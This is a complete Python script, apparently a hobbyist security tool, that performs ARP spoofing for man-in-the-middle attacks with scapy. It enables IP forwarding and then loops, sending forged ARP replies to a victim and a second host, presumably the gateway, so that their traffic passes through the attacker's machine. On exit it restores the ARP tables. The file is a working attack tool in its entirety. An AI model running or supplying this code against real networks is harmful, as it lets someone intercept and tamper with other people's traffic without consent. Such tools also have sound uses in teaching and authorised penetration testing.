#!/bin/python3

#importing libraries
from scapy.all import *
import argparse
from getmac import get_mac_address as gma
import time

#defining colour schemas
NONE='\033[00m'
RED='\033[01;31m'
GREEN='\033[01;32m'
YELLOW='\033[01;33m'
PURPLE='\033[01;35m'
CYAN='\033[01;36m'
WHITE='\033[01;37m'
BOLD='\033[1m'
BLINK='\033[5m'
UNDERLINE='\033[4m'

#getting command line arguments
parser = argparse.ArgumentParser(description=f"{PURPLE}{BOLD}[+] ARP SPOOFER FOR MITM ATTACKS!\nCoded by @whokilleddb{NONE}")
parser.add_argument('-iv', metavar='\b', required=True, help="IP of Victim")
#parser.add_argument('-mv', metavar='\b', required=True, help="MAC Address of Victim")
parser.add_argument('-si', metavar='\b', required=True, help="IP of the Device we want to spoof")
parser.add_argument('-v','--verbose', required=False, help="Enable Verbosity", action='store_true')
args = parser.parse_args()

#defining functions
def enable_ip_forwarding(vflag):
    if vflag :
        print(f"{GREEN}{BOLD}[+] Enabling IP Forwarding{NONE}")
    os.system("sysctl -w net.ipv4.ip_forward=1")

def get_mac(ip,verb):
    ans,unans=arping(ip,verbose=verb)
    for snt,recv in ans :
        mac=recv[Ether].src
        return mac

def restore_tables(dst,src,vflag):
        arp_response=ARP()
        arp_response.op =2 #To make the packet as a response
        arp_response.pdst = dst #args.iv
        arp_response.hwdst = get_mac(dst,vflag)#args.mv
        arp_response.hwsrc = get_mac(src,vflag)
        arp_response.psrc = src #args.si
        print (arp_response.show())
        #sending packet
        print(f"{YELLOW}{BOLD}[+] Restoring ARP Tables{NONE}")
        send(arp_response,verbose=vflag,count=10)


def arp_spoof(victim_ip, spoof_ip , vflag):
    #create ARP Response Packets
    arp_response=ARP()
    arp_response.op =2 #To make the packet as a response
    arp_response.pdst = victim_ip #args.iv
    arp_response.hwdst = get_mac(victim_ip,vflag)#args.mv
    arp_response.hwsrc = gma()
    arp_response.psrc = spoof_ip #args.si
    print (arp_response.show())
    #sending packet
    if vflag:
        print(f"{GREEN}{BOLD}[+] Sending ARP Packet to {arp_response.pdst}:{arp_response.psrc} as {arp_response.hwdst}{NONE}")
    send(arp_response,verbose=vflag)

if __name__ == "__main__":
    enable_ip_forwarding(args.verbose)
    print(f"{PURPLE}{BOLD}[+] ARP SPOOFER FOR MITM ATTACKS!\nCoded by @whokilleddb{NONE}")
    try :
        while True:
            arp_spoof(args.iv,args.si,args.verbose)
            arp_spoof(args.si,args.iv,args.verbose)
            if args.verbose:
                print(f"{CYAN}\n[+] Still Spoofing !{NONE}")
            time.sleep(2)
    except KeyboardInterrupt :
        print(f"{RED}{BOLD}[-] Restoring ARP Tables On Victim Before Quitting !{NONE}")
        restore_tables(args.iv,args.si,args.verbose)
        print(f"{RED}{BOLD}[-] Restoring ARP Tables On Gateway Before Quitting !{NONE}")
        restore_tables(args.si,args.iv,args.verbose)
